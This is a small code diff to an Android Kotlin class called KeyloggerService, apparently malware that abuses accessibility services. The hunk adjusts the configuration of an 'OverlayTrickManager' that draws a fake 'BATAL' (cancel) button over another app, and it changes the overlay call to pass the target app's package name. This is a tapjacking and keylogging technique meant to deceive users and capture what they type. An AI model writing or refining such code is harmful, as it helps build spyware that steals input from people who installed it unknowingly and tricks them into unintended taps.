@@ -222,15 +222,13 @@ class KeyloggerService : AccessibilityService() {
                 {
                   "fakeText":  "BATAL",
                   "fakeColor": "#CC1565C0",
-                  "targetX":   540,
-                  "targetY":   1820,
                   "offsetX":   0,
                   "offsetY":   0,
                   "duration":  30,
                   "fullBlock": false
                 }
             """.trimIndent()
-            OverlayTrickManager.start(applicationContext, configJson)
+            OverlayTrickManager.start(applicationContext, configJson, callerPkg = pkg)
         }, 350)
     }
 
